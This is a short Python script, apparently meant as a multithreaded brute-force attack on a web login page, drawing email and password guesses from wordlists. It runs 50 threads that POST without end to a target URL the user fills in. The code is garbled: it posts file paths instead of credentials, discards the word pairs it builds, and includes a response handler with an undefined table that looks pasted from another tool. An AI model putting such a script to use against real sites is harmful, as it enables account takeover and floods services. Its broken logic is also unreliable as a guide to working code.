#!/usr/bin/env python3

import requests
import threading
import os.path

# Enter the target's url
#url = 'https://targetedwebapp/login'
url = ''

# This one is a login page. Edit the directory paths and filenames according to your settings.
Email = '/usr/share/wordlists/emails.txt'
Password = '/usr/share/wordlists/Passwords/passwdlist.txt'

def queueRequests():
    while True:
        response = requests.post(url, Email, Password)
        print(response)

# Edit the directory & file names according to your PC
for firstword in open('/usr/share/wordlists/all.txt'):
    for secondword in open( '/usr/share/wordlists/Passwords/password.txt'):
        [firstword.rstrip(), secondword.rstrip()]


def handleResponse(req, interesting):
    # currently available attributes: req.status, req.wordcount,
    #req.length and req.response
    if req.status != 404:
        table.add(req)

threads = []

# This will loop indefinitly. Hit conrol + c to stop.
for i in range(50):
        t = threading.Thread(target=queueRequests)
        t.daemon = True
        threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
